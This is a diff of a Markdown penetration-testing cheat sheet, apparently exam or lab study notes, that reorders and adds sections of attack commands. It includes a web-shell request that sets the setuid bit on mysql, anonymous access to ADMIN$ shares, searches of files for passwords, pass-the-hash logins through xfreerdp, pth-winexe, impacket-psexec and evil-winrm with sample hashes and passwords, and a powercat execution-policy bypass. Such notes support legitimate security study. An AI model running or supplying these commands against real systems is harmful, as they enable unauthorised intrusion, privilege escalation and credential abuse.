@@ -15,12 +15,6 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo && fg
 ```
 
-## GUI smb/ftp folder
-```
-xdg-open smb://
-xdg-open ftp://
-```
-
 ## Python http server
 ```
 python2 -m SimpleHTTPServer 80
@@ -41,20 +35,6 @@ curl -i -s -k -X $'GET' $'https://10.1.1.1/php-reverse-shell.php'
 
 #POST:
 curl -i -s -k -X $'POST' --data-binary $'cmd=chmod%20%2Bs%20%2Fusr%2Fbin%2Fmysql&submit' $'http://10.1.1.1:8080/start_page.php?page=cmd.php'
-```
-
-## Find something
-Linux
-```
-grep -R password .                                  (find word inside files)
-find . -iname flag                                  (find file name)
-find . -type f -name "*.php"                        (find file type/extension)
-```
-Windows
-```
-findstr /spin "password" *.*                        (find word inside files)
-dir /s *flag*                                       (find file name)
-findstr /si password *.xml *.ini *.txt *.config     (find word inside files type/extension)
 ```
 
 ## Port forwarding
@@ -86,6 +66,26 @@ sudo feroxbuster -u http://10.1.1.1 -t 10 -w /root/.config/AutoRecon/wordlists/d
 gobuster dir -u https://10.1.1.1/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -b ''
 curl -sSikf http://10.1.1.1/robots.txt
 curl -sSikf http://10.1.1.1/.well-known/security.txt
+```
+
+## GUI smb/ftp folder
+```
+xdg-open smb://
+xdg-open ftp://
+```
+
+## Mount/connect share
+Linux
+```
+sudo mount -t cifs //10.11.1.136/'Bob Share' /tmp/lol
+sudo mount -o port=5555 -t nfs 127.0.0.1:/srv/Share /tmp/lol
+
+smbclient -N //10.2.2.23/ADMIN$             (connect smb share)
+smbclient -U '%' -N \\\\10.2.2.23\\ADMIN$ 
+```
+Windows
+```
+net use * \\192.168.119.142\lolll
 ```
 
 ## Linux transfer file methods
@@ -237,6 +237,38 @@ klist
 ```
 add command at end of .ps1 file, then
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -file powercat.ps1
+```
+
+## Find something
+Linux
+```
+grep -R password .                                  (find word inside files)
+find . -iname flag                                  (find file name)
+find . -type f -name "*.php"                        (find file type/extension)
+```
+Windows
+```
+findstr /spin "password" *.*                        (find word inside files)
+dir /s *flag*                                       (find file name)
+findstr /si password *.xml *.ini *.txt *.config     (find word inside files type/extension)
+```
+
+## Connect to Windows machine
+```
+# RDP
+rdesktop -E -r clipboard:CLIPBOARD -u eric -p sup3rs3cr3t 10.11.1.1
+xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /v:10.11.1.1
+xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /pth:cb2d5be3c78be06d47b697468ad3b33b /v:10.11.1.1
+
+# Winexe/Psexec/Smb
+pth-winexe -U tomahawk%00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 //10.1.1.248 cmd.exe
+impacket-psexec -hashes 00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 tomahawk@10.1.1.248
+
+# evil-winrm
+evil-winrm -i 10.11.1.1 -u john -p easyas123
+
+# Runas another user
+runas /env /noprofile /user:tomahawk RibSt3ak69 "%SystemRoot%\system32\cmd.exe"
 ```
 
 ## Exploit compiling
